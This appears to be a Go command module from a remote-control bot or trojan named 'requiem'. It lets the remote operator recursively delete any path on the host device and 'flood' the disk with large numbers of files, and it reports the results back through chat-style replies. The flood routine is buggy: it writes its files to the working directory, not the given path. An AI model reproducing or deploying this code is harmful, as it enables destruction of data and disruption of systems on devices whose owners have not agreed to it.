package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"requiem/store"
	"requiem/utils"
)

func (*FileCommand) Exec(ctx *store.CommandContext, args []string) {
	if len(args) < 2 {
		ctx.ReplyMsg("🟥 You need to provide a flag and a path.")
		return
	}

	content := strings.Join(args, " ")

	path := utils.UnwrapQuotes(content)
	if path == "" {
		ctx.ReplyMsg("🟥 You need to wrap the path in double quotes.")
		return
	}

	if utils.HasFlag(content, "delete") {
		err := os.RemoveAll(path)
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to delete - %s", err))
			return
		}

		ctx.ReplyMsg(fmt.Sprintf("🟩 Successfully deleted %q", path))
		return
	}

	if utils.HasFlag(content, "flood") {
		count, found := utils.FindNumber(content)
		if found == false {
			ctx.ReplyMsg("🟥 You need to provide a number.")
			return
		}

		os.MkdirAll(filepath.Dir(path), 0666)

		for i := range count {
			name := fmt.Sprintf("%d%d", time.Now().UnixNano(), i)

			file, _ := os.Create(name)
			file.Close()
		}

		ctx.ReplyMsg(fmt.Sprintf("🟩 Successfully flooded %q", path))
		return
	}

	ctx.ReplyMsg("🟥 Invalid flag.")
}

func (*FileCommand) Name() string {
	return "file"
}

func (*FileCommand) Info() string {
	return "Do things with the files on the deivce."
}

type FileCommand struct{}
